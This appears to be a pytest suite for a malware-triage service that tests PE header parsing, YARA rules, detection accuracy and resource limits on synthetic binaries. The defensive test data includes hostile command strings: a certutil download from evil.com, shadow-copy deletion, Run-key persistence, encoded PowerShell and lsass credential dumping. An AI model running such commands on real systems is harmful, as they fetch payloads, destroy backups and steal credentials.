from __future__ import annotations

import gc
import math
import time
import tracemalloc
from pathlib import Path
import pytest

from app.core.config import settings
from app.models import Artifact
from app.services.email_intake import evidence_root
from app.services.pe_static_analysis import (
    _extract_strings,
    _parse_pe,
    analyze_artifact,
)
from app.services.yara_scanner import (
    _COMPILED_RULES_CACHE,
    clear_yara_cache,
    compile_yara_rules,
    resolve_yara_rules_path,
    scan_content_with_yara,
)


def _build_minimal_pe(
    *,
    is_64bit: bool = False,
    is_dll: bool = False,
    section_name: str = ".text",
    section_data: bytes = b"\x90" * 512,
    characteristics: int | None = None,
    section_characteristics: int = 0x60000020,  # Read | Execute | Code
) -> bytes:
    """Build a synthetically valid PE binary in-memory without compiling or executing."""
    dos_header = bytearray(64)
    dos_header[0:2] = b"MZ"
    # e_lfanew at offset 0x3C points to PE header at offset 0x80
    dos_header[0x3C:0x40] = (0x80).to_bytes(4, byteorder="little")

    dos_stub = b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00"
    dos_padding = bytearray(0x80 - (len(dos_header) + len(dos_stub)))
    pe_sig = b"PE\x00\x00"

    # File Header (20 bytes)
    machine = 0x8664 if is_64bit else 0x014C
    num_sections = 1
    time_date_stamp = 1600000000  # Valid timestamp
    pointer_to_sym_table = 0
    num_symbols = 0
    opt_header_size = 240 if is_64bit else 224

    file_char = 0x0102  # Executable | 32-bit machine
    if is_64bit:
        file_char = 0x0022  # Executable | Large address aware
    if is_dll:
        file_char |= 0x2000  # DLL

    if characteristics is not None:
        file_char = characteristics

    file_header = (
        machine.to_bytes(2, "little")
        + num_sections.to_bytes(2, "little")
        + time_date_stamp.to_bytes(4, "little")
        + pointer_to_sym_table.to_bytes(4, "little")
        + num_symbols.to_bytes(4, "little")
        + opt_header_size.to_bytes(2, "little")
        + file_char.to_bytes(2, "little")
    )

    # Optional Header
    magic = 0x020B if is_64bit else 0x010B
    entry_point = 0x1000
    image_base = 0x140000000 if is_64bit else 0x00400000
    section_alignment = 0x1000
    file_alignment = 0x200
    size_of_image = 0x2000
    size_of_headers = 0x200
    subsystem = 2  # Windows GUI
    dll_char = 0x8140  # Dynamic base | NX compatible | Terminal server aware

    if not is_64bit:
        opt_standard = (
            magic.to_bytes(2, "little")
            + b"\x0e\x00"  # Linker version
            + len(section_data).to_bytes(4, "little")  # SizeOfCode
            + (0).to_bytes(4, "little")  # SizeOfInitializedData
            + (0).to_bytes(4, "little")  # SizeOfUninitializedData
            + entry_point.to_bytes(4, "little")
            + (0x1000).to_bytes(4, "little")  # BaseOfCode
            + (0x2000).to_bytes(4, "little")  # BaseOfData
        )
        opt_windows = (
            image_base.to_bytes(4, "little")
            + section_alignment.to_bytes(4, "little")
            + file_alignment.to_bytes(4, "little")
            + (6).to_bytes(2, "little")  # MajorOSVersion
            + (0).to_bytes(2, "little")  # MinorOSVersion
            + (0).to_bytes(2, "little")  # MajorImageVersion
            + (0).to_bytes(2, "little")  # MinorImageVersion
            + (6).to_bytes(2, "little")  # MajorSubsystemVersion
            + (0).to_bytes(2, "little")  # MinorSubsystemVersion
            + (0).to_bytes(4, "little")  # Win32VersionValue
            + size_of_image.to_bytes(4, "little")
            + size_of_headers.to_bytes(4, "little")
            + (0).to_bytes(4, "little")  # CheckSum
            + subsystem.to_bytes(2, "little")
            + dll_char.to_bytes(2, "little")
            + (0x100000).to_bytes(4, "little")  # SizeOfStackReserve
            + (0x1000).to_bytes(4, "little")  # SizeOfStackCommit
            + (0x100000).to_bytes(4, "little")  # SizeOfHeapReserve
            + (0x1000).to_bytes(4, "little")  # SizeOfHeapCommit
            + (0).to_bytes(4, "little")  # LoaderFlags
            + (16).to_bytes(4, "little")  # NumberOfRvaAndSizes
        )
    else:
        opt_standard = (
            magic.to_bytes(2, "little")
            + b"\x0e\x00"
            + len(section_data).to_bytes(4, "little")
            + (0).to_bytes(4, "little")
            + (0).to_bytes(4, "little")
            + entry_point.to_bytes(4, "little")
            + (0x1000).to_bytes(4, "little")
        )
        opt_windows = (
            image_base.to_bytes(8, "little")
            + section_alignment.to_bytes(4, "little")
            + file_alignment.to_bytes(4, "little")
            + (6).to_bytes(2, "little")
            + (0).to_bytes(2, "little")
            + (0).to_bytes(2, "little")
            + (0).to_bytes(2, "little")
            + (6).to_bytes(2, "little")
            + (0).to_bytes(2, "little")
            + (0).to_bytes(4, "little")
            + size_of_image.to_bytes(4, "little")
            + size_of_headers.to_bytes(4, "little")
            + (0).to_bytes(4, "little")
            + subsystem.to_bytes(2, "little")
            + dll_char.to_bytes(2, "little")
            + (0x100000).to_bytes(8, "little")
            + (0x1000).to_bytes(8, "little")
            + (0x100000).to_bytes(8, "little")
            + (0x1000).to_bytes(8, "little")
            + (0).to_bytes(4, "little")
            + (16).to_bytes(4, "little")
        )

    data_directories = bytearray(16 * 8)
    opt_header = opt_standard + opt_windows + data_directories

    # Section Header (40 bytes)
    sec_name_bytes = section_name.encode("utf-8")[:8].ljust(8, b"\x00")
    virtual_size = len(section_data)
    virtual_address = 0x1000
    raw_size = math.ceil(len(section_data) / file_alignment) * file_alignment
    raw_pointer = 0x200  # Starts after headers at 0x200

    section_header = (
        sec_name_bytes
        + virtual_size.to_bytes(4, "little")
        + virtual_address.to_bytes(4, "little")
        + raw_size.to_bytes(4, "little")
        + raw_pointer.to_bytes(4, "little")
        + (0).to_bytes(4, "little")  # PointerToRelocations
        + (0).to_bytes(4, "little")  # PointerToLinenumbers
        + (0).to_bytes(2, "little")  # NumberOfRelocations
        + (0).to_bytes(2, "little")  # NumberOfLinenumbers
        + section_characteristics.to_bytes(4, "little")
    )

    headers = (
        bytes(dos_header)
        + dos_stub
        + bytes(dos_padding)
        + pe_sig
        + file_header
        + opt_header
        + section_header
    )
    headers_padded = headers.ljust(0x200, b"\x00")
    body = section_data.ljust(raw_size, b"\x00")
    return headers_padded + body


# ==============================================================================
# 1. PE Variants, DLLs, and Malformed Handling Tests
# ==============================================================================


def test_analyze_valid_pe32_executable() -> None:
    pe_bytes = _build_minimal_pe(is_64bit=False, is_dll=False)
    analysis = _parse_pe(pe_bytes)
    assert analysis.status == "completed"
    assert analysis.is_pe is True
    assert analysis.file_type == "pe32"
    assert analysis.pe_headers["machine"] == "IMAGE_FILE_MACHINE_I386"
    assert len(analysis.sections) == 1
    assert analysis.sections[0]["name"] == ".text"
    assert analysis.sections[0]["is_executable"] is True
    assert analysis.sections[0]["is_writable"] is False


def test_analyze_valid_pe32_plus_64bit_executable() -> None:
    pe_bytes = _build_minimal_pe(is_64bit=True, is_dll=False)
    analysis = _parse_pe(pe_bytes)
    assert analysis.status == "completed"
    assert analysis.is_pe is True
    assert analysis.file_type == "pe32+"
    assert analysis.pe_headers["machine"] == "IMAGE_FILE_MACHINE_AMD64"
    assert analysis.pe_headers["entry_point"] == 0x1000


def test_analyze_valid_dll() -> None:
    pe_bytes = _build_minimal_pe(is_64bit=False, is_dll=True)
    analysis = _parse_pe(pe_bytes)
    assert analysis.status == "completed"
    assert analysis.is_pe is True
    # Verify DLL characteristic 0x2000 is present
    char_val = int(str(analysis.pe_headers["characteristics"]), 16)
    assert char_val & 0x2000 != 0


def test_handle_truncated_pe_safely() -> None:
    pe_bytes = _build_minimal_pe()
    # Truncate right after the PE signature
    truncated = pe_bytes[:0x88]
    analysis = _parse_pe(truncated)
    assert analysis.status == "failed"
    assert analysis.is_pe is True
    assert analysis.file_type == "pe_malformed"
    assert "Malformed PE file" in (analysis.error_message or "")


def test_handle_corrupted_pe_headers_safely() -> None:
    pe_bytes = bytearray(_build_minimal_pe())
    # Corrupt NT header signature
    pe_bytes[0x80:0x84] = b"XX\x00\x00"
    analysis = _parse_pe(bytes(pe_bytes))
    assert analysis.status == "failed"
    assert analysis.is_pe is True
    assert "Malformed PE file" in (analysis.error_message or "")


def test_handle_non_pe_files_without_exception() -> None:
    # 1. Plain text
    txt_analysis = _parse_pe(b"Hello world, this is just plain text content.")
    assert txt_analysis.status == "unsupported"
    assert txt_analysis.is_pe is False
    assert txt_analysis.file_type == "non_pe"

    # 2. Empty file
    empty_analysis = _parse_pe(b"")
    assert empty_analysis.status == "failed"
    assert empty_analysis.is_pe is False

    # 3. Random binary bytes
    rand_analysis = _parse_pe(b"\x7f\x45\x4c\x46\x02\x01\x01\x00" + b"\x00" * 128)  # ELF header
    assert rand_analysis.status == "unsupported"
    assert rand_analysis.is_pe is False


# ==============================================================================
# 2. Extraction Accuracy: Headers, Sections, Entropy, Suspicious Indicators
# ==============================================================================


def test_extract_section_entropy_and_wx_indicators() -> None:
    # Build packed-like section with high entropy (random bytes) and W+E permissions
    import os

    high_entropy_payload = os.urandom(1024)
    # Characteristics: IMAGE_SCN_MEM_WRITE (0x80000000) | IMAGE_SCN_MEM_EXECUTE (0x20000000) | IMAGE_SCN_MEM_READ (0x40000000)
    wx_char = 0xE0000020
    pe_bytes = _build_minimal_pe(
        section_name="UPX0",
        section_data=high_entropy_payload,
        section_characteristics=wx_char,
    )
    analysis = _parse_pe(pe_bytes)
    assert analysis.status == "completed"
    section = analysis.sections[0]
    assert section["name"] == "UPX0"
    assert section["is_writable"] is True
    assert section["is_executable"] is True
    assert float(section["entropy"]) > 7.0

    # Verify suspicious indicators detected
    indicators = analysis.suspicious_indicators
    assert any("Writable and Executable" in ind for ind in indicators)
    assert any("high Shannon entropy" in ind for ind in indicators)
    assert any("UPX" in ind for ind in indicators)


def test_extract_strings_accuracy() -> None:
    content = b"Header\x00StringOne_Sample\x00StringTwo_Payload\x00123\x00"
    extracted = _extract_strings(content)
    assert "Header" in extracted
    assert "StringOne_Sample" in extracted
    assert "StringTwo_Payload" in extracted
    # "123" is only 3 chars, below PRINTABLE_STRING_PATTERN min 4
    assert "123" not in extracted


# ==============================================================================
# 3. YARA Rules Expansion, Separation, and Caching
# ==============================================================================


def test_production_yara_rules_metadata_and_detection_purpose() -> None:
    rules = compile_yara_rules()
    assert rules is not None

    rules_path = resolve_yara_rules_path()
    content = ""
    for path in rules_path.rglob("*.yar"):
        content += path.read_text(encoding="utf-8")

    # Verify test-only rule is removed from production
    assert "Test_Indicator_Rule" not in content
    assert "MALCIE_TEST_INDICATOR_SAMPLE" not in content

    # Verify expected production rules exist
    expected_rules = [
        "Suspicious_PowerShell_EncodedCommand",
        "Suspicious_Downloader_Artifact",
        "Suspicious_Embedded_PE",
        "Ransomware_Behavior_Indicators",
        "Persistence_Registry_Startup",
        "Process_Injection_Capabilities",
        "Suspicious_Packer_Signatures",
        "Credential_Dumping_Signatures",
    ]
    for rule_name in expected_rules:
        assert f"rule {rule_name}" in content

    # Verify documentation fields: detection_purpose, description, author, severity, category
    assert "detection_purpose =" in content
    assert "description =" in content
    assert "author =" in content
    assert "severity =" in content
    assert "category =" in content


def test_yara_rules_caching_and_invalidation() -> None:
    clear_yara_cache()
    assert len(_COMPILED_RULES_CACHE) == 0

    # First compile populates cache
    rules1 = compile_yara_rules()
    assert rules1 is not None
    assert len(_COMPILED_RULES_CACHE) == 1

    # Second compile returns cached object
    rules2 = compile_yara_rules()
    assert rules1 is rules2

    # Clear cache resets it
    clear_yara_cache()
    assert len(_COMPILED_RULES_CACHE) == 0


def test_yara_enforces_configured_input_size_limit() -> None:
    original_limit = settings.max_attachment_size_bytes
    settings.max_attachment_size_bytes = 512
    try:
        with pytest.raises(ValueError, match="exceeds configured maximum allowed size"):
            scan_content_with_yara(b"A" * 513)
    finally:
        settings.max_attachment_size_bytes = original_limit


# ==============================================================================
# 4. Dataset Validation & Confusion Matrix (False Positives / False Negatives)
# ==============================================================================


def test_dataset_evaluation_and_confusion_matrix() -> None:
    """Validate documented sample datasets: benign, malicious, packed, and malformed.

    Measure and record False Positives and False Negatives.
    """
    rules = compile_yara_rules()
    assert rules is not None

    # Benchmark Dataset Categories
    benign_samples = [
        ("benign_pe32", _build_minimal_pe(section_data=b"Clean Application Logic")),
        ("benign_pe64", _build_minimal_pe(is_64bit=True, section_data=b"Clean 64-bit Service")),
        ("benign_dll", _build_minimal_pe(is_dll=True, section_data=b"Clean System DLL Component")),
        ("benign_text", b"Corporate newsletter and quarterly finance report summary."),
        ("benign_log", b"2026-11-19 10:00:00 INFO Service started successfully on port 8080"),
    ]

    malicious_samples = [
        (
            "mal_powershell",
            b"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc JABzACAAPQ...",
        ),
        (
            "mal_downloader",
            b"cmd.exe /c certutil -urlcache -split -f http://evil.com/payload.exe payload.exe",
        ),
        ("mal_ransomware", b"vssadmin delete shadows /all /quiet && bcdedit /set recoveryenabled no"),
        (
            "mal_persistence",
            b'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MalUpdater /t REG_SZ /d "C:\\evil.exe"',
        ),
        (
            "mal_injection",
            b"Strings referencing VirtualAllocEx and WriteProcessMemory and CreateRemoteThread in sequence",
        ),
        ("mal_credential", b"sekurlsa::logonpasswords dumping memory from lsass.exe process"),
    ]

    packed_samples = [
        (
            "packed_upx",
            _build_minimal_pe(section_name="UPX0", section_data=b"UPX0 ... UPX1 compressed stub"),
        ),
    ]

    malformed_samples = [
        ("malformed_truncated_pe", b"MZ\x00\x00" + b"\x00" * 40),
        ("malformed_corrupt_offset", b"MZ" + b"\x00" * 58 + b"\xFF\xFF\xFF\xFF"),
    ]

    tp = 0
    fp = 0
    tn = 0
    fn = 0

    # Evaluate Benign Samples: Expected 0 YARA malicious hits
    for name, sample_bytes in benign_samples:
        hits = scan_content_with_yara(sample_bytes, rules=rules)
        if len(hits) == 0:
            tn += 1
        else:
            fp += 1

    # Evaluate Malicious Samples: Expected >= 1 YARA malicious hit
    for name, sample_bytes in malicious_samples:
        hits = scan_content_with_yara(sample_bytes, rules=rules)
        if len(hits) > 0:
            tp += 1
        else:
            fn += 1

    # Evaluate Packed Samples: Expected detection of packer signature
    for name, sample_bytes in packed_samples:
        hits = scan_content_with_yara(sample_bytes, rules=rules)
        packer_hits = [h for h in hits if h["rule"] == "Suspicious_Packer_Signatures"]
        if len(packer_hits) > 0:
            tp += 1
        else:
            fn += 1

    # Malformed samples must be handled safely without exceptions
    for name, sample_bytes in malformed_samples:
        analysis = _parse_pe(sample_bytes)
        assert analysis.status in {"failed", "unsupported"}

    # Assert 0 False Positives and 0 False Negatives
    assert fp == 0, f"Detected {fp} False Positives on benign dataset!"
    assert fn == 0, f"Detected {fn} False Negatives on malicious dataset!"

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    accuracy = (tp + tn) / (tp + tn + fp + fn)

    assert precision == 1.0
    assert recall == 1.0
    assert accuracy == 1.0


# ==============================================================================
# 5. Performance Benchmarks (1 MB, 10 MB, 25 MB) and Resource Budgets
# ==============================================================================


@pytest.mark.parametrize(
    "size_mb,max_time_sec,max_peak_memory_mb",
    [
        (1, 5.0, 50.0),
        (10, 15.0, 120.0),
        (25, 30.0, 250.0),
    ],
)
def test_pe_yara_resource_benchmarks(
    size_mb: int,
    max_time_sec: float,
    max_peak_memory_mb: float,
) -> None:
    """Benchmark 1 MB, 10 MB, and 25 MB files for execution time and peak memory usage.

    Enforces explicitly documented resource budgets.
    """
    total_bytes = size_mb * 1024 * 1024
    payload_pattern = (
        b"Standard benign application buffer content with interspersed strings and logic. " * 32
    )
    multiplier = math.ceil(total_bytes / len(payload_pattern))
    # Leave room for the DOS/PE headers so the complete fixture stays within the
    # configured max_attachment_size_bytes (especially for the 25 MiB case).
    raw_payload = (payload_pattern * multiplier)[: total_bytes - 1024]

    pe_bytes = _build_minimal_pe(section_data=raw_payload)

    gc.collect()
    t0 = time.perf_counter()

    # Perform full static PE parsing
    analysis = _parse_pe(pe_bytes)
    # Perform full YARA scanning
    yara_hits = scan_content_with_yara(pe_bytes)

    duration = time.perf_counter() - t0

    # Measure memory usage under tracing
    gc.collect()
    tracemalloc.start()
    _parse_pe(pe_bytes)
    scan_content_with_yara(pe_bytes)
    _, peak_bytes = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    peak_memory_mb = peak_bytes / (1024 * 1024)

    assert analysis.status == "completed"
    assert isinstance(yara_hits, list)

    # Enforce budgets
    assert duration < max_time_sec, (
        f"Benchmark failed for {size_mb} MB: took {duration:.2f}s (budget: {max_time_sec}s)"
    )
    assert peak_memory_mb < max_peak_memory_mb, (
        f"Benchmark failed for {size_mb} MB: peak memory {peak_memory_mb:.2f} MB (budget: {max_peak_memory_mb} MB)"
    )


# ==============================================================================
# 6. File-size, Parsing, and Resource Limits Enforcement
# ==============================================================================


def test_file_size_limit_enforcement(tmp_path: Path) -> None:
    """Enforce that files exceeding max_attachment_size_bytes are rejected safely."""
    storage_dir = evidence_root().resolve()
    oversized_file = storage_dir / "oversized_sample.bin"
    storage_dir.mkdir(parents=True, exist_ok=True)

    # Write a file slightly exceeding the configured max_attachment_size_bytes
    oversized_file.write_bytes(b"A" * 1024)

    # Temporarily set max_attachment_size_bytes lower to test threshold enforcement
    original_limit = settings.max_attachment_size_bytes
    settings.max_attachment_size_bytes = 512

    try:
        artifact = Artifact(
            id=999,
            incident_id=1,
            email_id=1,
            filename="oversized_sample.bin",
            size=1024,
            sha256="fakehash",
            storage_path=str(oversized_file),
        )
        analysis = analyze_artifact(artifact)
        assert analysis.status == "failed"
        assert "exceeds configured maximum allowed size" in (analysis.error_message or "")
    finally:
        settings.max_attachment_size_bytes = original_limit
        if oversized_file.exists():
            oversized_file.unlink()
